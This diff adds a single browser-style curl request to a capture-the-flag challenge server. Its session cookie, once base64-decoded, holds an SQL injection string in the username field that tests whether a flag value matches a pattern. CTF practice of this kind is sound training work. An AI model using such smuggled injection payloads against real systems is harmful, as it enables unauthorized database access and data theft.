@@ -1,0 +1,11 @@
+curl 'http://dvd.chal.h4ck3r.quest:10001/' \
+  -H 'Connection: keep-alive' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+  -H 'Referer: http://dvd.chal.h4ck3r.quest:10001/login' \
+  -H 'Accept-Language: en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7' \
+  -H 'Cookie: session=MTYzNjYzNzIwMXxEdi1CQkFFQ180SUFBUkFCRUFBQVFQLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dnQUI0bklHOXlJR1pzWVdjZ1VrVkhSVmhRSUNkZVJreEJSeTRxSnlBdExTQT18XmNsimZHIwDo_6tWX6jfh4v9_uSJfy7LmCxzBZq815I=; Path=/; Expires=Sat, 11 Dec 2021 13:26:41 GMT; Max-Age=2592000' \ 
+  --compressed \
+  --insecure
